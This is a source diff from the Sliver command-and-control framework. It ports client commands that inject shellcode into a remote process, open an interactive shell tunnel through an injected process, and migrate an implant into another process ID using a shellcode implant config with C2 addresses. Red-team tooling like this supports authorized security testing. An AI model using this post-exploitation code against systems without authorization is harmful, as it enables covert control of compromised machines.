@@ -18,234 +18,232 @@ package command
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// import (
-// 	"bytes"
-// 	"debug/pe"
-// 	"encoding/binary"
-// 	"fmt"
-// 	"io"
-// 	"io/ioutil"
-// 	"log"
-// 	"os"
-// 	"strconv"
-// 	"strings"
-// 	"time"
+import (
+	"bufio"
+	"context"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"log"
+	"os"
+	"strconv"
 
-// 	"github.com/bishopfox/sliver/client/core"
-// 	"github.com/bishopfox/sliver/client/spin"
-// 	"github.com/bishopfox/sliver/protobuf/clientpb"
-// 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-// 	"golang.org/x/crypto/ssh/terminal"
+	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/client/spin"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/rpcpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"golang.org/x/crypto/ssh/terminal"
 
-// 	"github.com/desertbit/grumble"
-// 	"github.com/golang/protobuf/proto"
-// )
+	"github.com/desertbit/grumble"
+)
 
-// func executeShellcode(ctx *grumble.Context, server *core.SliverServer) {
+func executeShellcode(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 
-// 	activeSliver := ActiveSliver.Sliver
-// 	if activeSliver == nil {
-// 		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
-// 		return
-// 	}
+	session := ActiveSession.GetInteractive()
+	if session == nil {
+		return
+	}
 
-// 	if len(ctx.Args) != 1 {
-// 		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
-// 		return
-// 	}
-// 	interactive := ctx.Flags.Bool("interactive")
-// 	pid := ctx.Flags.Uint("pid")
-// 	shellcodePath := ctx.Args[0]
-// 	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
-// 	if err != nil {
-// 		fmt.Printf(Warn+"Error: %s\n", err.Error())
-// 		return
-// 	}
-// 	if pid != 0 && interactive {
-// 		fmt.Printf(Warn + "Cannot use both `--pid` and `--interactive`\n")
-// 		return
-// 	}
-// 	if interactive {
-// 		executeInteractive(ctx, `c:\windows\system32\notepad.exe`, shellcodeBin, server)
-// 		return
-// 	}
-// 	ctrl := make(chan bool)
-// 	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
-// 	go spin.Until(msg, ctrl)
-// 	data, _ := proto.Marshal(&clientpb.TaskReq{
-// 		Data:     shellcodeBin,
-// 		SliverID: ActiveSliver.Sliver.ID,
-// 		RwxPages: ctx.Flags.Bool("rwx-pages"),
-// 		Pid:      uint32(pid),
-// 	})
-// 	resp := <-server.RPC(&sliverpb.Envelope{
-// 		Type: clientpb.MsgTask,
-// 		Data: data,
-// 	}, defaultTimeout)
-// 	ctrl <- true
-// 	<-ctrl
-// 	if resp.Err != "" {
-// 		fmt.Printf(Warn+"%s\n", resp.Err)
-// 	}
-// 	fmt.Printf(Info + "Executed payload on target\n")
-// }
+	if len(ctx.Args) != 1 {
+		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
+		return
+	}
+	interactive := ctx.Flags.Bool("interactive")
+	pid := ctx.Flags.Uint("pid")
+	shellcodePath := ctx.Args[0]
+	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+	if err != nil {
+		fmt.Printf(Warn+"Error: %s\n", err.Error())
+		return
+	}
+	if pid != 0 && interactive {
+		fmt.Printf(Warn + "Cannot use both `--pid` and `--interactive`\n")
+		return
+	}
+	if interactive {
+		executeInteractive(ctx, `c:\windows\system32\notepad.exe`, shellcodeBin, ctx.Flags.Bool("rwx-pages"), rpc)
+		return
+	}
+	ctrl := make(chan bool)
+	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
+	go spin.Until(msg, ctrl)
+	task, err := rpc.Task(context.Background(), &sliverpb.TaskReq{
+		Data:     shellcodeBin,
+		RWXPages: ctx.Flags.Bool("rwx-pages"),
+		Pid:      uint32(pid),
+		Request:  ActiveSession.Request(ctx),
+	})
+	ctrl <- true
+	<-ctrl
+	if task.Response.GetErr() != "" {
+		fmt.Printf(Warn+"Error: %s\n", task.Response.GetErr())
+		return
+	}
+	fmt.Printf(Info + "Executed shellcode on target\n")
+}
 
-// func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, server *core.SliverServer) {
-// 	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")
-// 	noPty := false
-// 	if ActiveSliver.Sliver.OS == windows {
-// 		noPty = true // Windows of course doesn't have PTYs
-// 	}
-// 	tunnel, err := server.CreateTunnel(ActiveSliver.Sliver.ID, defaultTimeout)
-// 	if err != nil {
-// 		log.Printf(Warn+"%s", err)
-// 		return
-// 	}
+func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, rpc rpcpb.SliverRPCClient) {
+	// Check active session
+	session := ActiveSession.Get()
+	if session == nil {
+		return
+	}
+	// Start remote process and tunnel
+	noPty := false
+	if session.GetOS() == "windows" {
+		noPty = true // Windows of course doesn't have PTYs
+	}
 
-// 	shellReqData, _ := proto.Marshal(&sliverpb.ShellReq{
-// 		SliverID:  ActiveSliver.Sliver.ID,
-// 		EnablePTY: !noPty,
-// 		TunnelID:  tunnel.ID,
-// 		Path:      hostProc,
-// 	})
-// 	resp := <-server.RPC(&sliverpb.Envelope{
-// 		Type: sliverpb.MsgShellReq,
-// 		Data: shellReqData,
-// 	}, defaultTimeout)
-// 	if resp.Err != "" {
-// 		fmt.Printf(Warn+"Error: %s", resp.Err)
-// 		return
-// 	}
-// 	shellResp := &sliverpb.Shell{}
-// 	err = proto.Unmarshal(resp.Data, shellResp)
-// 	if err != nil {
-// 		fmt.Printf(Warn+"Error unmarshaling data: %v", err)
-// 		return
-// 	}
+	rpcTunnel, err := rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
+		SessionID: session.ID,
+	})
 
-// 	pid := shellResp.Pid
-// 	ctrl := make(chan bool)
-// 	msg := fmt.Sprintf("Sending shellcode to %s ...", ActiveSliver.Sliver.Name)
-// 	go spin.Until(msg, ctrl)
-// 	data, _ := proto.Marshal(&clientpb.TaskReq{
-// 		Data:     shellcode,
-// 		SliverID: ActiveSliver.Sliver.ID,
-// 		RwxPages: ctx.Flags.Bool("rwx-pages"),
-// 		Pid:      uint32(pid),
-// 	})
-// 	resp = <-server.RPC(&sliverpb.Envelope{
-// 		Type: clientpb.MsgTask,
-// 		Data: data,
-// 	}, defaultTimeout)
-// 	ctrl <- true
-// 	<-ctrl
-// 	if resp.Err != "" {
-// 		fmt.Printf(Warn+"%s\n", resp.Err)
-// 	}
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v\n", err)
+		return
+	}
 
-// 	var oldState *terminal.State
-// 	if !noPty {
-// 		oldState, err = terminal.MakeRaw(0)
-// 		log.Printf("Saving terminal state: %v", oldState)
-// 		if err != nil {
-// 			fmt.Printf(Warn + "Failed to save terminal state")
-// 			return
-// 		}
-// 	}
-// 	cleanup := func() {
-// 		log.Printf("[client] cleanup tunnel %d", tunnel.ID)
-// 		tunnelClose, _ := proto.Marshal(&sliverpb.ShellReq{
-// 			TunnelID: tunnel.ID,
-// 		})
-// 		server.RPC(&sliverpb.Envelope{
-// 			Type: sliverpb.MsgTunnelClose,
-// 			Data: tunnelClose,
-// 		}, defaultTimeout)
-// 		if !noPty {
-// 			log.Printf("Restoring old terminal state: %v", oldState)
-// 			terminal.Restore(0, oldState)
-// 		}
-// 	}
-// 	go func() {
-// 		defer cleanup()
-// 		_, err := io.Copy(os.Stdout, tunnel)
-// 		if err != nil {
-// 			fmt.Printf(Warn+"error write stdout: %v", err)
-// 			return
-// 		}
-// 	}()
-// 	for {
-// 		_, err := io.Copy(tunnel, os.Stdin)
-// 		if err == io.EOF {
-// 			break
-// 		}
-// 		if err != nil {
-// 			fmt.Printf(Warn+"error read stdin: %v", err)
-// 			break
-// 		}
-// 	}
+	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
-// }
+	shell, err := rpc.Shell(context.Background(), &sliverpb.ShellReq{
+		Request:   ActiveSession.Request(ctx),
+		Path:      hostProc,
+		EnablePTY: !noPty,
+		TunnelID:  tunnel.ID,
+	})
 
-// func migrate(ctx *grumble.Context, rpc RPCServer) {
-// 	activeSliver := ActiveSliver.Sliver
-// 	if activeSliver == nil {
-// 		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
-// 		return
-// 	}
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v\n", err)
+		return
+	}
+	// Retrieve PID and start remote task
+	pid := shell.GetPid()
 
-// 	if len(ctx.Args) != 1 {
-// 		fmt.Printf(Warn + "You must provide a PID to migrate to")
-// 		return
-// 	}
+	ctrl := make(chan bool)
+	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
+	go spin.Until(msg, ctrl)
+	_, err = rpc.Task(context.Background(), &sliverpb.TaskReq{
+		Request:  ActiveSession.Request(ctx),
+		Pid:      pid,
+		Data:     shellcode,
+		RWXPages: rwxPages,
+	})
+	ctrl <- true
+	<-ctrl
 
-// 	pid, err := strconv.Atoi(ctx.Args[0])
-// 	if err != nil {
-// 		fmt.Printf(Warn+"Error: %v", err)
-// 	}
-// 	config := getActiveSliverConfig()
-// 	ctrl := make(chan bool)
-// 	msg := fmt.Sprintf("Migrating into %d ...", pid)
-// 	go spin.Until(msg, ctrl)
-// 	data, _ := proto.Marshal(&clientpb.MigrateReq{
-// 		Pid:      uint32(pid),
-// 		Config:   config,
-// 		SliverID: ActiveSliver.Sliver.ID,
-// 	})
-// 	resp := <-rpc(&sliverpb.Envelope{
-// 		Type: clientpb.MsgMigrate,
-// 		Data: data,
-// 	}, 45*time.Minute)
-// 	ctrl <- true
-// 	<-ctrl
-// 	if resp.Err != "" {
-// 		fmt.Printf(Warn+"%s\n", resp.Err)
-// 	} else {
-// 		fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
-// 	}
-// }
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v", err)
+		return
+	}
 
-// func getActiveSliverConfig() *clientpb.SliverConfig {
-// 	activeSliver := ActiveSliver.Sliver
-// 	c2s := []*clientpb.SliverC2{}
-// 	c2s = append(c2s, &clientpb.SliverC2{
-// 		URL:      activeSliver.ActiveC2,
-// 		Priority: uint32(0),
-// 	})
-// 	config := &clientpb.SliverConfig{
-// 		GOOS:   activeSliver.GetOS(),
-// 		GOARCH: activeSliver.GetArch(),
-// 		Debug:  true,
+	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
+	fmt.Printf(Info+"Started remote shell with pid %d\n\n", shell.Pid)
 
-// 		MaxConnectionErrors: uint32(1000),
-// 		ReconnectInterval:   uint32(60),
+	var oldState *terminal.State
+	if !noPty {
+		oldState, err = terminal.MakeRaw(0)
+		log.Printf("Saving terminal state: %v", oldState)
+		if err != nil {
+			fmt.Printf(Warn + "Failed to save terminal state")
+			return
+		}
+	}
 
-// 		Format:      clientpb.SliverConfig_SHELLCODE,
-// 		IsSharedLib: true,
-// 		C2:          c2s,
-// 	}
-// 	return config
-// }
+	log.Printf("Starting stdin/stdout shell ...")
+	go func() {
+		n, err := io.Copy(os.Stdout, tunnel)
+		log.Printf("Wrote %d bytes to stdout", n)
+		if err != nil {
+			fmt.Printf(Warn+"Error writing to stdout: %v", err)
+			return
+		}
+	}()
+	for {
+		log.Printf("Reading from stdin ...")
+		n, err := io.Copy(tunnel, os.Stdin)
+		log.Printf("Read %d bytes from stdin", n)
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			fmt.Printf(Warn+"Error reading from stdin: %v", err)
+			break
+		}
+	}
+
+	if !noPty {
+		log.Printf("Restoring terminal state ...")
+		terminal.Restore(0, oldState)
+	}
+
+	log.Printf("Exit interactive")
+	bufio.NewWriter(os.Stdout).Flush()
+
+}
+
+func migrate(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
+	session := ActiveSession.Get()
+	if session == nil {
+		return
+	}
+
+	if len(ctx.Args) != 1 {
+		fmt.Printf(Warn + "You must provide a PID to migrate to")
+		return
+	}
+
+	pid, err := strconv.ParseUint(ctx.Args[0], 10, 32)
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v", err)
+	}
+	config := getActiveSliverConfig()
+	ctrl := make(chan bool)
+	msg := fmt.Sprintf("Migrating into %d ...", pid)
+	go spin.Until(msg, ctrl)
+	migrate, err := rpc.Migrate(context.Background(), &clientpb.MigrateReq{
+		Pid:     uint32(pid),
+		Config:  config,
+		Request: ActiveSession.Request(ctx),
+	})
+
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v", err)
+		return
+	}
+	ctrl <- true
+	<-ctrl
+	if !migrate.Success {
+		fmt.Printf(Warn+"%s\n", migrate.GetResponse().GetErr())
+		return
+	}
+	fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
+}
+
+func getActiveSliverConfig() *clientpb.ImplantConfig {
+	session := ActiveSession.Get()
+	if session == nil {
+		return nil
+	}
+	c2s := []*clientpb.ImplantC2{}
+	c2s = append(c2s, &clientpb.ImplantC2{
+		URL:      session.GetActiveC2(),
+		Priority: uint32(0),
+	})
+	config := &clientpb.ImplantConfig{
+		GOOS:   session.GetOS(),
+		GOARCH: session.GetArch(),
+		Debug:  true,
+
+		MaxConnectionErrors: uint32(1000),
+		ReconnectInterval:   uint32(60),
+
+		Format:      clientpb.ImplantConfig_SHELLCODE,
+		IsSharedLib: true,
+		C2:          c2s,
+	}
+	return config
+}
 
 // func executeAssembly(ctx *grumble.Context, rpc RPCServer) {
 // 	if ActiveSliver.Sliver == nil {
